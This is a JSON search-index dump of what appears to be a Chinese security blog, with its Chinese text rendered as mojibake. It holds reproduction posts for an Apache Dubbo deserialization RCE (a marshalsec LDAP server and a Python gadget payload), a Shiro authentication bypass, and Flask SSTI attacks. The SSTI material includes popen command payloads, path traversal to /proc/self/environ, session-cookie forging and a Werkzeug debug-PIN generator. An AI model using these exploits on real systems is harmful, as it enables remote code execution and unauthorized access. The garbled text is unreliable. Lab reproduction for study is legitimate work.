è¿›è¡Œç¼–è¯‘ï¼Œå¦åˆ™ååºåˆ—åŒ–å¤±è´¥ã€‚ å¯åŠ¨ LDAP æœåŠ¡ï¼š java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/#ExportObject\" 8087 å¯åŠ¨ HTTP æœåŠ¡ï¼š python3 -m http.server è¿è¡Œ consumer.javaï¼Œååºåˆ—åŒ–ï¼š å‘ç°å¯ä»¥æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚ ä½¿ç”¨ poc è¿›è¡Œæµ‹è¯•ï¼š ä½¿ç”¨å‰å…ˆ pip install dubbo from dubbo.codec.hessian2 import Decoder,new_object from dubbo.client import DubboClient client = DubboClient('127.0.0.1', 20881) JdbcRowSetImpl=new_object( 'com.sun.rowset.JdbcRowSetImpl', dataSource=\"ldap://127.0.0.1:8087/#ExportObject\", strMatchColumns=[\"foo\"] ) JdbcRowSetImplClass=new_object( 'java.lang.Class', name=\"com.sun.rowset.JdbcRowSetImpl\", ) toStringBean=new_object( 'com.rometools.rome.feed.impl.ToStringBean', beanClass=JdbcRowSetImplClass, obj=JdbcRowSetImpl ) resp = client.send_request_and_return_response( service_name='org.apache.dubbo.spring.boot.demo.consumer.DemoService', method_name='rce', args=[toStringBean]) ","date":"2020-07-01","objectID":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/:2:0","tags":["Dubbo","æ¼æ´å¤ç°"],"title":"Apache Dubbo Providerååºåˆ—åŒ–æ¼æ´(CVE-2020-1948)","uri":"/2020/07/apache-dubbo-provider%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2020-1948/"},{"categories":["æ¼æ´å¤ç°"],"content":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/","tags":["Shiro","æ¼æ´å¤ç°"],"title":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["æ¼æ´å¤ç°"],"content":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989) ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:0:0","tags":["Shiro","æ¼æ´å¤ç°"],"title":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“èŒƒå›´ Apache Shiro \u003c 1.5.3 Spring æ¡†æ¶ä¸­åªä½¿ç”¨ Shiro é‰´æƒ ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:1:0","tags":["Shiro","æ¼æ´å¤ç°"],"title":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º git clone https://github.com/l3yx/springboot-shiro.git å°†é¡¹ç›®å¯¼å…¥ IDEA ä¸­ï¼Œæœ¬åœ°æ¼”ç¤ºç¯å¢ƒä¸º Mac OSï¼Œé…ç½® Maven: /usr/local/Cellar/maven/3.6.3_1/libexec/conf/settings.xml æ·»åŠ æœ¬åœ°é•œåƒï¼š \u003cmirror\u003e \u003cid\u003ealimaven\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003ealiyun maven\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/repositories/central/\u003c/url\u003e \u003c/mirror\u003e \u003c!-- ä¸‹é¢çš„ä¸¤ä¸ªä¸­å¤®ä»“åº“éƒ½æ˜¯ maven è½¯ä»¶å†…ç½®çš„ï¼ŒæœåŠ¡äºæ•´ä¸ªäº’è”ç½‘ï¼Œç”± Maven å›¢é˜Ÿè‡ªå·±ç»´æŠ¤ï¼Œé‡Œé¢å­˜å‚¨äº†éå¸¸å…¨çš„ jar åŒ…ï¼ŒåŒ…å«äº†ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†æµè¡Œçš„å¼€æºé¡¹ç›®æ„ä»¶ --\u003e \u003c!-- ä¸­å¤®ä»“åº“1 --\u003e \u003cmirror\u003e \u003cid\u003erepo1\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003eHuman Readable Name for this Mirror.\u003c/name\u003e \u003curl\u003ehttp://repo1.maven.org/maven2/\u003c/url\u003e \u003c/mirror\u003e \u003c!-- ä¸­å¤®ä»“åº“2 --\u003e \u003cmirror\u003e \u003cid\u003erepo2\u003c/id\u003e \u003cmirrorOf\u003ecentral\u003c/mirrorOf\u003e \u003cname\u003eHuman Readable Name for this Mirror.\u003c/name\u003e \u003curl\u003ehttp://repo2.maven.org/maven2/\u003c/url\u003e \u003c/mirror\u003e æ›´æ”¹ IDEA ä¸­çš„ Maven home directory å’Œ User settings file é…ç½®ï¼š ç”Ÿæˆ war åŒ…ï¼š å°†æ‰“åŒ…å¥½çš„ war åŒ…éƒ¨ç½²äº Tomcat ã€‚è¯¥æ¼æ´æˆåŠŸåˆ©ç”¨å­˜åœ¨ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ åº”ç”¨ä¸èƒ½éƒ¨ç½²åœ¨æ ¹ç›®å½•ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ context-path ï¼Œ server.servlet.context-path=/shiro ,å¦‚æœä¸ºæ ¹ç›®å½•åˆ™ context-path ä¸ºç©ºï¼Œå°±ä¼šè¢« CVE-2020-1957 çš„ patch å°† URL æ ¼å¼åŒ–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è‹¥ Shiro ç‰ˆæœ¬å°äº 1.5.2 çš„è¯é‚£ä¹ˆè¯¥æ¡ä»¶å°±ä¸éœ€è¦ã€‚ Spring æ§åˆ¶å™¨ä¸­æ²¡æœ‰å¦å¤–çš„æƒé™æ ¡éªŒä»£ç  æ¼æ´ç¯å¢ƒçš„æƒé™é…ç½®å¦‚ä¸‹ï¼Œå…¶ä¸­ /admin ä¸‹çš„è·¯ç”±éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®: @Bean ShiroFilterFactoryBean shiroFilterFactoryBean(){ ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean(); bean.setSecurityManager(securityManager()); bean.setLoginUrl(\"/login\"); bean.setSuccessUrl(\"/index\"); bean.setUnauthorizedUrl(\"/unauthorizedurl\"); Map\u003cString, String\u003e map = new LinkedHashMap\u003c\u003e(); map.put(\"/doLogin\", \"anon\"); map.put(\"/admin/*\", \"authc\"); bean.setFilterChainDefinitionMap(map); return bean; } --- @GetMapping(\"/admin/page\") public String admin() { return \"admin page\"; } ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:2:0","tags":["Shiro","æ¼æ´å¤ç°"],"title":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° å¦‚æœç›´æ¥è®¿é—® /shiro/admin/page ï¼Œä¼šè¿”å› 302 è·³è½¬è¦æ±‚ç™»å½• ç›´æ¥è®¿é—® /;/test/admin/page , å°±èƒ½ç›´æ¥ç»•è¿‡ Shiro æƒé™éªŒè¯ï¼Œè®¿é—®åˆ° /admin è·¯ç”±ä¸­çš„ä¿¡æ¯ ","date":"2020-07-01","objectID":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/:3:0","tags":["Shiro","æ¼æ´å¤ç°"],"title":"Shiro æƒé™ç»•è¿‡æ¼æ´å¤ç°(CVE-2020-11989)","uri":"/2020/07/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2020-11989/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:0:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"python è¯­è¨€åŸºç¡€ åœ¨ python ä¸­ï¼Œobject ç±»æ˜¯ Python ä¸­æ‰€æœ‰ç±»çš„åŸºç±»ï¼Œå¦‚æœå®šä¹‰ä¸€ä¸ªç±»æ—¶æ²¡æœ‰æŒ‡å®šç»§æ‰¿å“ªä¸ªç±»ï¼Œåˆ™é»˜è®¤ç»§æ‰¿ object ç±»ã€‚ æ¯ä¸ªç±»éƒ½æœ‰çš„é­”æœ¯å˜é‡ __class__ï¼Œè¡¨ç¤ºå½“å‰ç±»ã€‚ print(\"\".__class__) æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª __base__ å±æ€§ï¼Œåˆ—å‡ºå…¶åŸºç±»ï¼š åˆ—å‡ºæ‰€æœ‰åŸºç±»ï¼š__bases__ åˆ—ä¸¾ç±»çš„è°ƒç”¨é¡ºåºï¼š__mro__ è·å–å­ç±»é›†åˆï¼š''.__class__.__mro__[1].__subclasses__() æ¥ä¸‹æ¥å¯»æ‰¾å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å­ç±»ï¼šos._wrap_close(133) æŸ¥æ‰¾å¯ä½¿ç”¨çš„å˜é‡å’Œæ–¹æ³•ï¼š\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('ls').read() è¯»å–æ–‡ä»¶å†…å®¹ï¼š\"\".__class__.__mro__[1].__subclasses__()[133].__init__.__globals__[\"__builtins__\"][\"open\"](\"flag.txt\").read() ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:1:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSTI ç®€ä»‹ \u0026 ç¯å¢ƒæ­å»º ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ¨¡æ¿ ä¸€ä¸ªç»Ÿä¸€é£æ ¼çš„ç«™ç‚¹ï¼Œå…¶å¤§å¤šæ•°é¡µé¢æ ·å¼éƒ½æ˜¯ä¸€è‡´çš„ï¼Œåªæ˜¯æ¯ä¸ªé¡µé¢æ˜¾ç¤ºçš„å†…å®¹å„ä¸ç›¸åŒã€‚è¦æ˜¯æ‰€æœ‰çš„é€»è¾‘éƒ½æ”¾åœ¨å‰ç«¯è¿›è¡Œï¼Œæ— ç–‘ä¼šå½±å“å“åº”æ•ˆæœå’Œæ•ˆç‡ï¼Œå¾ˆä¸ç°å®ã€‚æŠŠæ‰€æœ‰çš„é€»è¾‘æ”¾åœ¨åç«¯ï¼Œåˆä¼šå¯¼è‡´å¤ªè¿‡å¤æ‚ï¼Œå‰è½»åé‡ æ¨¡æ¿çš„è¯ç”Ÿæ˜¯ä¸ºäº†å°†æ˜¾ç¤ºä¸æ•°æ®åˆ†ç¦»ï¼Œè®©å‰ç«¯å·¥ä½œäººå‘˜ä¸“æ³¨è¡¨ç°è®¾è®¡ï¼Œåå°äººå‘˜æ³¨é‡ä¸šåŠ¡é€»è¾‘ï¼ŒåŒæ—¶ç®€åŒ–ä»£ç çš„å¤æ‚ç¨‹åº¦ã€‚æ¨¡æ¿æŠ€æœ¯å¤šç§å¤šæ ·ï¼Œä½†å…¶æœ¬è´¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®é€šè¿‡æ¨¡æ¿å¼•æ“ç”Ÿæˆæœ€ç»ˆçš„HTMLä»£ç ã€‚ Flask ä½¿ç”¨ Jinja2 ä½œä¸ºæ¨¡æ¿å¼•æ“ï¼ŒJinja çš„è¯­æ³•å¾ˆç®€å•ï¼Œå¤§è‡´æœ‰è¿™ä¹ˆå‡ ç§ï¼š {%...%} è¯­å¥ (Statements) {{...}} æ‰“å°æ¨¡æ¿è¾“å‡ºçš„è¡¨è¾¾å¼ (Expressions) {{#...#}} æ³¨é‡Š #...## è¡Œæ³¨é‡Š (Line Statements) ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:1","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSTI åœ¨ SSTI æ¼æ´ç‚¹ä¸­ï¼Œ{{x}} é‡Œé¢çš„å†…å®¹ä¼šè¢«æ‰§è¡Œã€‚ SSTIï¼Œåˆç§°æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚jinja2 æ¨¡æ¿ä¸­ä½¿ç”¨ {} è¯­æ³•è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ã€‚å½“åˆ©ç”¨ jinja2 è¿›è¡Œæ¸²æŸ“çš„æ—¶å€™ï¼Œå®ƒä¼šæŠŠè¿™äº›ç‰¹æ®Šçš„å ä½ç¬¦è¿›è¡Œå¡«å……/æ›¿æ¢ã€‚ä½†æ˜¯åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„æ¶æ„å†…å®¹ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€ GetShell ç­‰é—®é¢˜ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:2","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ç¯å¢ƒæ­å»º æµ‹è¯•ç¯å¢ƒæ­å»ºï¼šUbuntu + Docker ç¯å¢ƒï¼š https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:2:3","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ•æ„Ÿä¿¡æ¯æ³„éœ²å¯¼è‡´èº«ä»½ä¼ªé€  ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"flask session æœºåˆ¶ é€šè¿‡.éš”å¼€çš„ 3 æ®µå†…å®¹ï¼Œç¬¬ä¸€æ®µå…¶å®å°±æ˜¯ base64encode åçš„å†…å®¹ï¼Œä½†å»æ‰äº†å¡«å……ç”¨çš„ç­‰å·ï¼Œè‹¥ decode å¤±è´¥ï¼Œè‡ªå·±éœ€è¦è¡¥ä¸Š 1-3 ä¸ªç­‰å·è¡¥å…¨ã€‚ä¸­é—´å†…å®¹ä¸ºæ—¶é—´æˆ³ï¼Œåœ¨ flask ä¸­æ—¶é—´æˆ³è‹¥è¶…è¿‡ 31 å¤©åˆ™è§†ä¸ºæ— æ•ˆã€‚æœ€åä¸€æ®µåˆ™æ˜¯å®‰å…¨ç­¾åï¼Œå°† session dataï¼Œæ—¶é—´æˆ³å’Œ flask çš„ secretkey é€šè¿‡ sha1 è¿ç®—çš„ç»“æœã€‚ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:1","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ–¹æ³•ä¸€ è¯¥åº”ç”¨åœ¨ /hello ä¸‹å­˜åœ¨ SSTI æ¼æ´: config ä¸‹æ³„éœ²äº† SECRET_KEYï¼š ä½¿ç”¨ flask-unsign å·¥å…·ï¼ˆä½¿ç”¨ pip å®‰è£…ï¼‰ä¼ªé€  Cookieï¼š flask-unsign --sign --cookie \"{'balance': 6666}\" --secret \"7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ\" ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:2","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ–¹æ³•äºŒ http://127.0.0.1:8345/download?image=1.jpg å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œä¸‹è½½ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼š http://127.0.0.1:8345/download?image=../../../../../../../../../proc/self/environ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:3:3","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Flask PIN ç åˆ©ç”¨ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Flask PIN ç  Flask Debug åº”ç”¨åœ¨æ¨¡å¼ä¸‹æä¾›çš„ä¸€ç§é¡µé¢ç«¯çš„äº¤äº’è°ƒè¯•å·¥å…·ï¼Œå’Œæˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„ Python å‘½ä»¤è¡Œæ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªäº¤äº’å¼çš„ web ç«¯ shellã€‚ä½†æ˜¯ PIN ç çš„ç”Ÿæˆè§„åˆ™æ˜¯æœ‰è§„å¾‹å¯å¾ªçš„ï¼Œä½¿å¾—è·å– PIN ç æˆä¸ºå¯èƒ½ï¼Œä¹‹åèƒ½å¤Ÿåˆ©ç”¨çš„æ–¹å¼æœ‰å¾ˆå¤šã€‚ from itertools import chain probably_public_bits = [ 'root',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '345051575547'# str(uuid.getnode()), /sys/class/net/eth0/address '613cacd3857f425e9409e544dece08da', # get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) è„šæœ¬ä¸­ 6 ä¸ªå‚æ•°çš„è·å–æ–¹æ³•ï¼š username è¿è¡Œ flask çš„ç”¨æˆ·ï¼Œä¹‹å‰è¯»å– /etc/passwd è·å– modname ä¸€èˆ¬é»˜è®¤å³å¯ app name ä¸€èˆ¬é»˜è®¤å³å¯ è·¯å¾„ debug ä¸‹æŠ¥é”™ ç½‘ç»œåœ°å€ è¯»å–ï¼š/sys/class/net/eth0/address int(\"02:42:ac:13:00:02\".replace(\":\", \"\"), 16) æœºå™¨ç  è¯»å–ï¼š/etc/machine-id æˆ–è€… /proc/self/cgroup ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:1","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"æ‰§è¡Œè„šæœ¬ ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:4:2","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"SSTI å¯¼è‡´ RCE ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:0","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"ä»£ç æ‰§è¡Œ {%for i in range(10)%} {%print(i)%} {%endfor%} ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:1","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"python é­”æ³•å‡½æ•° + å†…ç½®å‡½æ•° é­”æ³•å‡½æ•° æ‰€è°“é­”æ³•å‡½æ•°(Magic Methods)ï¼Œæ˜¯ Python çš„ä¸€ç§é«˜çº§è¯­æ³•ï¼Œå…è®¸ä½ åœ¨ç±»ä¸­è‡ªå®šä¹‰å‡½æ•°(å‡½æ•°åæ ¼å¼ä¸€èˆ¬ä¸º __x__)ï¼Œå¹¶ç»‘å®šåˆ°ç±»çš„ç‰¹æ®Šæ–¹æ³•ä¸­ã€‚æ¯”å¦‚åœ¨ç±» A ä¸­è‡ªå®šä¹‰ __str__ å‡½æ•°ï¼Œåˆ™åœ¨è°ƒç”¨ str(A) æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ __str__ å‡½æ•°ï¼Œå¹¶è¿”å›ç›¸åº”çš„ç»“æœã€‚åœ¨æˆ‘ä»¬å¹³æ—¶çš„ä½¿ç”¨ä¸­ï¼Œå¯èƒ½ç»å¸¸ä½¿ç”¨ __init__ å‡½æ•°å’Œ __del__ å‡½æ•°ï¼Œå…¶å®è¿™ä¹Ÿæ˜¯é­”æ³•å‡½æ•°çš„ä¸€ç§ã€‚ å†…ç½®å‡½æ•° åœ¨ python ä¸­è¾“å…¥ help(__builtins__)ï¼Œå¯ä»¥æŸ¥çœ‹å¸®åŠ©ï¼Œç®€å•åœ°è¯´å°±æ˜¯ Python ä¸­è‡ªå¸¦çš„å‡½æ•° http://127.0.0.1:8345/hello?name=\\{\\{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()\\}\\} ","date":"2020-06-22","objectID":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/:5:2","tags":["æ¸—é€æµ‹è¯•","SSTI"],"title":"Flask SSTI åˆ©ç”¨æ–¹å¼æ¢ç´¢","uri":"/2020/06/flask-ssti-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%8E%A2%E7%B4%A2/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"Redis åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸è§çš„åˆ©ç”¨æ–¹å¼","date":"2020-05-25","objectID":"/2020/05/redis%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","tags":["Redis","æ¸—é€æµ‹è¯•"],"title":"Redis 